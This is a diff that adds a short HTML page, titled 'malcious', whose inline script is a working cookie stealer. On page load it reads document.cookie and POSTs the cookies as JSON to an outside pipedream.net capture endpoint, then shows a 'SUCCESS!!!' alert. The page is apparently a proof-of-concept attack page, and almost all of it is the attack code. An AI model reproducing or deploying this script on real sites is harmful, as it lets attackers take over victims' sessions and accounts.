@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>malcious</title>
+</head>
+
+<body>
+    <script>
+        const headers = new Headers()
+        headers.append("Content-Type", "application/json")
+
+        const body = {
+            "cookies": document.cookie
+        }
+
+        const options = {
+            method: "POST",
+            headers,
+            mode: "cors",
+            body: JSON.stringify(body),
+        }
+
+        fetch("https://eo9askyykvivacu.m.pipedream.net", options)
+        alert("SUCCESS!!!")
+    </script>
+</body>
+
+</html>
